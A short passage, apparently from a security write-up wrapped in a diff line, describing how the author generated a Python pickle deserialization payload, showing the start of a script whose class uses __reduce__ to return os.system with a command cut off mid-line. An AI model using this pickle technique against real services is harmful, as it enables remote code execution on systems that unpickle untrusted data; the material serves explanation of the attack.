@@ -1,0 +1,1 @@
+ry. " ) Generate Pickle Payload My initial attempt to exploit this involved writing a couple short Python scripts like in the blog post. I’ll start with the serialized payload: #!/usr/bin/env python3 import pickle import os class RunCommand : def __reduce__ ( self ): return ( os . system , ( '
